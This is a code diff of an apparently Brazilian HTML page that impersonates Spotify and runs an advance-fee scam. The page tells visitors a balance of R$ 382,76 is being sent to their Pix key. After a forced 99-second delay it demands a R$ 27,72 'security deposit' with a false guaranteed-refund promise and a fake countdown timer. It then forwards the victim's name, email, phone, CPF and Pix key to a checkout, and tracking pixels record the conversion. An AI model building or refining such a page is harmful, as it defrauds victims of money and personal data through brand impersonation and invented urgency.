@@ -1,141 +1,252 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<script type="text/javascript">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Spotify - Verificação de Segurança</title>
+
+  <!-- CLARITY -->
+  <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "vf9o4hng1f");
-</script>
+  </script>
 
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Spotify - Verificação</title>
-  
-  <!-- CONFIG.JS - Configurações Centralizadas -->
+  <!-- TIKTOK PIXEL -->
+  <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=r+"?sdkid="+e+"&lib="+t;var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a,c)};
+
+      ttq.load('DAFO7CJC77U250DBNFT0');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+
+  <!-- CONFIG.JS -->
   <script src="checkout/js/config.js"></script>
 
   <!-- FONT GOOGLE POPPINS -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
 
   <style>
-    body, html {
-      height: 100%;
+    /* RESET GERAL & CENTRALIZAÇÃO */
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      justify-content: space-around;
-      display: flex;
-      flex-direction: column;
+      font-family: "Poppins", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    html, body {
+      min-height: 100%;
+      width: 100%;
       background-color: rgb(24, 24, 24);
-      align-items: center;
-    }
-    .centralizado {
-      margin-top: 70px;
-      width: 300px;
-      background-color: rgb(0, 0, 0);
-      text-align: center;
-      padding: 20px;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
       align-items: center;
-      border-radius: 10px;
+      color: #ffffff;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
     }
-    * {
-      font-family: "Poppins", sans-serif;
-      color: white;
-      padding: 0px;
-    }
-    #logocentral {
-      width: 90px;
-    }
-    #textoprincipalsptfy {
-      font-size: 23px;
-      margin: 20px 0px;
-      font-weight: 700;
-    }
-    #descricaoiniciospotify {
-      color: rgb(168, 168, 168);
-      margin-top: -10px;
-      margin-bottom: -10px;
-      font-size: 14px;
-    }
-    #descricaoiniciospotifyy {
-      color: rgb(168, 168, 168);
-      font-size: 14px;
-      font-weight: 500;
-    }
-    #meuBotao {
-      display: block;
-      padding: 13px 10px;
-      background-color: gray;
-      color: white;
-      margin-top: 20px;
-      border-radius: 50px;
-      border: 1px solid gray;
-      text-decoration: none;
-      width: 90%;
-      font-weight: 600;
-      text-align: center;
-      pointer-events: none;
-    }
+
+    /* TOPO FIXO RESPONSIVO */
     #topoFixo {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       background-color: #000000;
-      color: white;
-      padding: 15px 10px;
-      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 14px 20px;
       display: flex;
       justify-content: space-between;
-      text-align: center;
-    }
-    #logo {
-      width: 130px;
-    }
-    #saldoatual {
-      padding: 10px 15px;
-      border-radius: 10px;
-      margin-right: 20px;
-      background-color: rgb(7, 187, 52);
-    }
-    #txtnotificacao {
-      color: white;
-    }
-    #notificacao {
-      background-color: rgba(1, 214, 97, 0.434);
-      display: flex;
-      margin-top: -10px;
       align-items: center;
-      margin-bottom: 20px;
-      text-align: center;
-      font-size: 14px;
-      justify-content: center;
-      width: 100%;
-      border-radius: 10px;
-      border: 1px solid rgb(1, 214, 97);
+      z-index: 1000;
+      box-sizing: border-box;
     }
+
+    #logo {
+      height: 30px;
+      width: auto;
+      max-width: 125px;
+      object-fit: contain;
+      object-position: left center;
+      display: block;
+    }
+
+    #saldoatual {
+      padding: 8px 14px;
+      border-radius: 20px;
+      background-color: rgb(7, 187, 52);
+      color: #000000;
+      font-weight: 700;
+      font-size: 13.5px;
+      white-space: nowrap;
+      box-shadow: 0 2px 10px rgba(7, 187, 52, 0.35);
+    }
+
+    /* CONTAINER PRINCIPAL FLUIDO */
+    .container {
+      width: 100%;
+      max-width: 440px;
+      margin-top: 75px;
+      margin-bottom: 40px;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      box-sizing: border-box;
+    }
+
+    /* CARD CENTRALIZADO */
+    .centralizado {
+      width: 100%;
+      background-color: #000000;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 16px;
+      padding: 28px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      box-sizing: border-box;
+    }
+
+    #logocentral {
+      width: 75px;
+      height: auto;
+      margin-bottom: 14px;
+      display: block;
+    }
+
+    #textoprincipalsptfy {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: #ffffff;
+      line-height: 1.3;
+      text-align: center;
+    }
+
+    /* NOTIFICAÇÃO DO PIX */
+    #notificacao {
+      background-color: rgba(1, 214, 97, 0.12);
+      border: 1px solid rgb(1, 214, 97);
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      width: 100%;
+      box-sizing: border-box;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #txtnotificacao {
+      color: #ffffff;
+      font-size: 13.5px;
+      line-height: 1.4;
+      margin: 0;
+      text-align: center;
+    }
+
+    /* VÍDEO VTURB FLUIDO */
     .video-container {
       width: 100%;
-      margin: 15px 0;
+      margin: 8px 0 16px 0;
       display: flex;
       justify-content: center;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #000000;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
     }
+
+    /* DESCRIÇÃO COM DELAY */
+    #descricaoiniciospotify {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 18px 16px;
+      margin-top: 15px;
+      margin-bottom: 15px;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 13.5px;
+      line-height: 1.6;
+      color: #d1d1d1;
+      text-align: left;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
     .hidden {
-      display: none;
+      display: none !important;
     }
+
+    /* BOTÃO PRINCIPAL */
+    #meuBotao {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px 12px;
+      background-color: #333333;
+      color: #888888;
+      margin-top: 15px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-size: 14.5px;
+      font-weight: 700;
+      text-align: center;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+      pointer-events: none;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+      border: none;
+    }
+
+    #meuBotao.ativo {
+      background-color: #1DB954;
+      color: #000000;
+      cursor: pointer;
+      pointer-events: auto;
+      box-shadow: 0 4px 20px rgba(29, 185, 84, 0.4);
+    }
+
+    #meuBotao.ativo:hover {
+      background-color: #1ed760;
+      transform: translateY(-2px);
+    }
+
+    /* AVISO LEGAL */
+    #descricaoiniciospotifyy {
+      color: #888888;
+      font-size: 11.5px;
+      font-weight: 400;
+      margin-top: 20px;
+      line-height: 1.5;
+      text-align: center;
+    }
+
     .link-verde {
-      color: rgb(1, 214, 97);
+      color: #1DB954;
       font-weight: 500;
       text-decoration: none;
     }
+
     .link-verde:hover {
       text-decoration: underline;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 
@@ -143,245 +254,83 @@
   <script>
     !function(n,i){i._plt=i._plt||[],i._pltInitDate=n.timeOrigin?n.timeOrigin+n.now():Date.now()}(window,performance);
   </script>
-<!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=r+"?sdkid="+e+"&lib="+t;var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a,c)};
-
-  ttq.load('DAFO7CJC77U250DBNFT0');
-  ttq.page();
-}(window, document, 'ttq');
-</script>
-<!-- TikTok Pixel Code End -->
-
 </head>
 
 <body>
   <!-- TOPO FIXO -->
-  <div id="topoFixo">
-    <img src="images/logo.png" id="logo" />
+  <header id="topoFixo">
+    <img src="/images/logo.png" id="logo" alt="Spotify" onerror="this.onerror=null; this.src='/checkout/images/logo.png';" />
     <div id="saldoatual">Saldo: R$ 382,76</div>
-  </div>
+  </header>
 
-  <div class="centralizado">
-    <!-- IMAGEM DA LOGO -->
-    <img src="images/logowhite.png" id="logocentral" />
+  <!-- CONTAINER CENTRALIZADO FLUIDO -->
+  <main class="container">
+    <div class="centralizado">
+      <!-- LOGO CENTRAL -->
+      <img src="/images/logowhite.png" id="logocentral" alt="Spotify" onerror="this.onerror=null; this.src='/checkout/images/logowhite.png';" />
 
-    <!-- TEXTO POP UP -->
-    <div id="textoprincipalsptfy">
-      Parabéns, <b id="mensagem">...</b>!
-    </div>
+      <!-- TEXTO PRINCIPAL -->
+      <h1 id="textoprincipalsptfy">
+        Parabéns, <b id="mensagem" style="color: #1DB954;">...</b>!
+      </h1>
 
-    <div id="notificacao">
-      <p id="txtnotificacao">
-        Enviando <b>R$ 382,76</b> para a chave pix <b id="pix">.</b>
+      <!-- NOTIFICAÇÃO DO PIX -->
+      <div id="notificacao">
+        <p id="txtnotificacao">
+          Enviando <b style="color: #1DB954;">R$ 382,76</b> para a chave pix <b id="pix" style="color: #ffffff; word-break: break-all;">.</b>
+        </p>
+      </div>
+
+      <!-- VÍDEO VTURB -->
+      <div class="video-container">
+        <vturb-smartplayer
+          id="vid-6922445e8dbc00147a2537b3"
+          style="display: block; margin: 0 auto; width: 100%; max-width: 380px; border-radius: 12px; overflow: hidden;">
+        </vturb-smartplayer>
+      </div>
+
+      <script type="text/javascript">
+        var s=document.createElement("script");
+        s.src="https://scripts.converteai.net/92655f4d-d0e8-448c-bcc8-f715a30b9f16/players/6922445e8dbc00147a2537b3/v4/player.js";
+        s.async=true;
+        document.head.appendChild(s);
+      </script>
+
+      <!-- DESCRIÇÃO COM DELAY -->
+      <div id="descricaoiniciospotify" class="hidden">
+        <div style="text-align: center; margin-bottom: 12px;">
+          <span style="background: rgba(29, 185, 84, 0.18); color: #1DB954; font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px;">
+            ✓ Reembolso 100% Garantido
+          </span>
+        </div>
+        <p style="margin-bottom: 10px; color: #ffffff; font-weight: 600;">
+          Esta taxa de R$ 27,72 não é um custo, mas sim um depósito de segurança.
+        </p>
+        <p style="margin-bottom: 12px;">
+          Você receberá o valor integral de <b style="color: #1DB954;">R$ 27,72</b> de volta junto com a sua primeira transferência de saldo. É a nossa garantia de que estamos focados em sua segurança e no seu sucesso.
+        </p>
+        <p style="color: #ffffff; margin-bottom: 0;">
+          Seu saldo está retido e a reserva expira em: 
+          <span id="timer" style="font-weight: 700; color: #1DB954; font-size: 15px;">12:00</span>.
+        </p>
+      </div>
+
+      <!-- BOTÃO -->
+      <a href="#" id="meuBotao">LIBERANDO SAQUE...</a>
+
+      <!-- AVISO LEGAL -->
+      <p id="descricaoiniciospotifyy">
+        Este site é protegido pelo reCAPTCHA e está sujeito à 
+        <a href="https://www.spotify.com/br-pt/legal/privacy-policy/" target="_blank" class="link-verde">
+          Política de Privacidade
+        </a>
+        e aos 
+        <a href="https://policies.google.com/terms?hl=pt-BR" target="_blank" class="link-verde">
+          Termos de Serviço do Google
+        </a>.
       </p>
     </div>
-
-    <!-- VÍDEO VTURB -->
-    <div class="video-container">
-      <vturb-smartplayer
-        id="vid-6922445e8dbc00147a2537b3"
-        style="display: block; margin: 0 auto; width: 100%; max-width: 280px;">
-      </vturb-smartplayer>
-    </div>
-
-    <script type="text/javascript">
-      var s=document.createElement("script");
-      s.src="https://scripts.converteai.net/92655f4d-d0e8-448c-bcc8-f715a30b9f16/players/6922445e8dbc00147a2537b3/v4/player.js";
-      s.async=true;
-      document.head.appendChild(s);
-    </script>
-
-    <!-- DESCRIÇÃO COM DELAY -->
-    <p id="descricaoiniciospotify" class="hidden">
-      <b>ATENÇÃO: Reembolso 100% Garantido!</b><br /><br />
-      Esta taxa de R$ 27,72 não é um custo, mas sim um depósito de segurança.<br /><br />
-      Você receberá o valor integral de <b>R$ 27,72</b> de volta junto com a sua primeira
-      transferência de saldo. É a nossa garantia de que estamos focados em sua segurança
-      e no seu sucesso.<br /><br />
-      Seu saldo está retido e a reserva expira em
-      <span id="timer" style="font-weight:700; color:rgb(1,214,97);">12:00</span>.<br /><br />
-      Não perca o valor que você conquistou.
-    </p>
-
-    <!-- BOTÃO -->
-    <a href="#" id="meuBotao">LIBERANDO SAQUE...</a>
-
-    <script>
-      // ==========================================
-      // GERENCIAMENTO DE PARÂMETROS
-      // ==========================================
-      
-      // Função para obter parâmetro da URL
-      function obterParametroUrl(nome) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(nome);
-      }
-
-      // Função para salvar parâmetros no localStorage
-      function salvarParametros() {
-        const params = new URLSearchParams(window.location.search);
-        const dadosCliente = {};
-        
-        // Capturar todos os parâmetros importantes
-        ['nome', 'email', 'telefone', 'pix', 'transacao_id', 
-         'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 
-         'sck', 'src'].forEach(param => {
-          const value = params.get(param);
-          if (value) {
-            dadosCliente[param] = value;
-            localStorage.setItem(param, value);
-          }
-        });
-        
-        // Se veio da obrigado.html, salvar dados do cliente
-        if (Object.keys(dadosCliente).length > 0) {
-          localStorage.setItem('dados_cliente_up1', JSON.stringify(dadosCliente));
-        }
-        
-        return dadosCliente;
-      }
-
-      // Função para carregar parâmetros (URL ou localStorage)
-      function carregarParametros() {
-        let dados = {};
-        
-        // Verificar modo dev
-        const params = new URLSearchParams(window.location.search);
-        dados.dev = params.get('dev') === 'true';
-        
-        // Primeiro, carregar TUDO da URL
-        ['nome', 'email', 'telefone', 'pix', 'cpf', 'transacao_id',
-         'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src'].forEach(param => {
-          const value = params.get(param);
-          if (value) dados[param] = value;
-        });
-        
-        // Complementar com localStorage se faltar dados do cliente
-        if (!dados.nome) {
-          // Tentar várias fontes de nome
-          dados.nome = localStorage.getItem('usuario_nome') ||
-                       localStorage.getItem('pix_nome') ||
-                       localStorage.getItem('usuario_nome_input') || '';
-        }
-        
-        if (!dados.email) {
-          dados.email = localStorage.getItem('usuario_email') || '';
-        }
-        
-        if (!dados.telefone) {
-          dados.telefone = localStorage.getItem('pix_chave') || '';
-        }
-        
-        if (!dados.pix) {
-          dados.pix = localStorage.getItem('pix_chave') || 
-                     localStorage.getItem('pix_key') || 
-                     'não cadastrada';
-        }
-        
-        // Tentar dados_cliente_up1
-        const dadosUp1 = localStorage.getItem('dados_cliente_up1');
-        if (dadosUp1) {
-          const du = JSON.parse(dadosUp1);
-          if (!dados.nome && du.nome) dados.nome = du.nome;
-          if (!dados.email && du.email) dados.email = du.email;
-          if (!dados.telefone && du.telefone) dados.telefone = du.telefone;
-          if (!dados.cpf && du.cpf) dados.cpf = du.cpf;
-          if (!dados.pix && du.pix) dados.pix = du.pix;
-        }
-        
-        // Tentar dados_cliente do checkout principal
-        const dadosCliente = localStorage.getItem('dados_cliente');
-        if (dadosCliente) {
-          const dc = JSON.parse(dadosCliente);
-          if (!dados.nome && dc.nome) dados.nome = dc.nome;
-          if (!dados.email && dc.email) dados.email = dc.email;
-          if (!dados.telefone && dc.telefone) dados.telefone = dc.telefone;
-          if (!dados.cpf && dc.cpf) dados.cpf = dc.cpf;
-          if (!dados.pix && dc.pix) dados.pix = dc.pix;
-        }
-        
-        return dados;
-      }
-
-      // Salvar e carregar parâmetros
-      salvarParametros();
-      const dados = carregarParametros();
-
-      // Atualizar interface
-      if (dados.nome) {
-        document.getElementById("mensagem").innerText = dados.nome;
-      }
-      if (dados.pix) {
-        document.getElementById("pix").innerText = dados.pix;
-      }
-
-      // ==========================================
-      // BOTÃO DE CHECKOUT
-      // ==========================================
-      
-      function mudarBotao() {
-        const botao = document.getElementById("meuBotao");
-        botao.style.backgroundColor = "rgb(1, 214, 97)";
-        botao.style.borderColor = "rgb(1, 214, 97)";
-        botao.style.cursor = "pointer";
-        botao.innerText = "FINALIZAR VERIFICAÇÃO E RECEBER";
-        botao.style.pointerEvents = "auto";
-
-        botao.onclick = function (e) {
-          e.preventDefault();
-          
-          // Construir URL para o checkout do up1
-          const params = new URLSearchParams();
-          
-          // Adicionar dados do cliente
-          if (dados.nome) params.append('nome', dados.nome);
-          if (dados.email) params.append('email', dados.email);
-          if (dados.telefone) params.append('telefone', dados.telefone);
-          if (dados.pix) params.append('pix', dados.pix);
-          
-          // Adicionar UTMs
-          ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src'].forEach(param => {
-            const value = dados[param] || localStorage.getItem(param);
-            if (value) params.append(param, value);
-          });
-          
-          // Redirecionar para checkout do up1
-          window.location.href = `checkout/index.html?${params.toString()}`;
-        };
-      }
-
-      // Delay do botão - 99 segundos (ou instantâneo se dev=true)
-      const delayBotao = dados.dev ? 0 : 99000;
-      setTimeout(mudarBotao, delayBotao);
-
-      // Delay dos textos - 99 segundos (ou instantâneo se dev=true)
-      function mostrarDescricao() {
-        const desc = document.getElementById("descricaoiniciospotify");
-        if (desc) {
-          desc.classList.remove("hidden");
-        }
-      }
-      setTimeout(mostrarDescricao, delayBotao);
-      
-      // Log do modo dev
-      if (dados.dev) {
-        console.log('🔧 MODO DEV ATIVO - Delays pulados');
-      }
-    </script>
-
-    <p id="descricaoiniciospotifyy">
-      Este site é protegido pelo reCAPTCHA e está sujeito à 
-      <a href="https://www.spotify.com/br-pt/legal/privacy-policy/" target="_blank" class="link-verde">
-        Política de Privacidade
-      </a>
-      e aos 
-      <a href="https://policies.google.com/terms?hl=pt-BR" target="_blank" class="link-verde">
-        Termos de Serviço do Google
-      </a>.
-    </p>
-  </div>
+  </main>
 
   <!-- UTMIFY -->
   <script
@@ -392,47 +341,121 @@
     defer
   ></script>
 
-  <!-- CRONÔMETRO -->
+  <!-- TIKTOK VIEWCONTENT -->
   <script>
-    let time = 600; // 10 minutos = 600 segundos
-
-    function formatTime(seconds) {
-      let min = Math.floor(seconds / 60);
-      let sec = seconds % 60;
-      return `${min < 10 ? "0" : ""}${min}:${sec < 10 ? "0" : ""}${sec}`;
+    if (window.ttq) {
+      ttq.track('ViewContent', {
+        content_id: 'up1',
+        content_name: 'Verificação de Segurança',
+        value: 27.72,
+        currency: 'BRL'
+      });
     }
-
-    function startTimer() {
-      const timerElement = document.getElementById("timer");
-
-      const countdown = setInterval(() => {
-        time--;
-        timerElement.innerText = formatTime(time);
-
-        if (time <= 30) {
-          timerElement.style.color = "rgb(255, 70, 70)";
-        }
-
-        if (time <= 0) {
-          clearInterval(countdown);
-          timerElement.innerText = "00:00";
-        }
-      }, 1000);
-    }
-
-    startTimer();
   </script>
 
-<script>
-  if (window.ttq) {
-    ttq.track('ViewContent', {
-      content_id: 'up1',
-      content_name: 'Verificação de Segurança',
-      value: 27.72,
-      currency: 'BRL'
-    });
-  }
-</script>
+  <!-- SCRIPT DE PARÂMETROS E BOTÃO -->
+  <script>
+    function obterParametros() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const dados = {};
 
+      dados.dev = urlParams.get('dev') === 'true' || localStorage.getItem('dev_mode') === 'true';
+
+      ['nome', 'email', 'telefone', 'pix', 'cpf', 'transacao_id',
+       'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(param => {
+        const val = urlParams.get(param);
+        if (val) dados[param] = val;
+      });
+
+      // Tentar dados_cliente_up1
+      try {
+        const dUp1 = JSON.parse(localStorage.getItem('dados_cliente_up1') || '{}');
+        Object.keys(dUp1).forEach(k => { if (!dados[k] && dUp1[k]) dados[k] = dUp1[k]; });
+      } catch(e) {}
+
+      // Tentar dados_cliente geral
+      try {
+        const dCli = JSON.parse(localStorage.getItem('dados_cliente') || '{}');
+        Object.keys(dCli).forEach(k => { if (!dados[k] && dCli[k]) dados[k] = dCli[k]; });
+      } catch(e) {}
+
+      if (!dados.nome) {
+        dados.nome = localStorage.getItem('usuario_nome') ||
+                     localStorage.getItem('pix_nome') ||
+                     localStorage.getItem('usuario_nome_input') || 'Usuário';
+      }
+      if (!dados.pix) {
+        dados.pix = localStorage.getItem('pix_chave') ||
+                    localStorage.getItem('pix_key') ||
+                    dados.telefone || 'chave cadastrada';
+      }
+
+      // Persistir
+      localStorage.setItem('dados_cliente_up1', JSON.stringify(dados));
+      return dados;
+    }
+
+    const dados = obterParametros();
+
+    // Atualizar UI
+    if (dados.nome) {
+      document.getElementById("mensagem").innerText = dados.nome;
+    }
+    if (dados.pix) {
+      document.getElementById("pix").innerText = dados.pix;
+    }
+
+    // Delay do botão e descrição: 99s ou 0s se dev=true
+    const delayMs = dados.dev ? 0 : 99000;
+
+    function ativarUpsell() {
+      const desc = document.getElementById("descricaoiniciospotify");
+      if (desc) desc.classList.remove("hidden");
+
+      const botao = document.getElementById("meuBotao");
+      if (botao) {
+        botao.classList.add("ativo");
+        botao.innerText = "FINALIZAR VERIFICAÇÃO E RECEBER";
+        botao.onclick = function(e) {
+          e.preventDefault();
+          const params = new URLSearchParams();
+          if (dados.nome) params.append('nome', dados.nome);
+          if (dados.email) params.append('email', dados.email);
+          if (dados.telefone) params.append('telefone', dados.telefone);
+          if (dados.pix) params.append('pix', dados.pix);
+          if (dados.cpf) params.append('cpf', dados.cpf);
+          
+          ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(param => {
+            const val = dados[param] || localStorage.getItem(param);
+            if (val) params.append(param, val);
+          });
+
+          // Redireciona para o checkout do up1
+          window.location.href = 'checkout/index.html?' + params.toString();
+        };
+      }
+    }
+
+    setTimeout(ativarUpsell, delayMs);
+    if (dados.dev) console.log('🔧 MODO DEV ATIVO - Delays liberados');
+
+    // Cronômetro 12:00
+    let tempoRestante = 720;
+    function atualizarTimer() {
+      const el = document.getElementById("timer");
+      if (!el) return;
+      const min = Math.floor(tempoRestante / 60);
+      const sec = tempoRestante % 60;
+      el.innerText = String(min).padStart(2, '0') + ":" + String(sec).padStart(2, '0');
+      if (tempoRestante <= 30) el.style.color = "rgb(255, 70, 70)";
+      if (tempoRestante > 0) {
+        tempoRestante--;
+      } else {
+        clearInterval(timerInt);
+        el.innerText = "00:00";
+      }
+    }
+    const timerInt = setInterval(atualizarTimer, 1000);
+  </script>
 </body>
 </html>
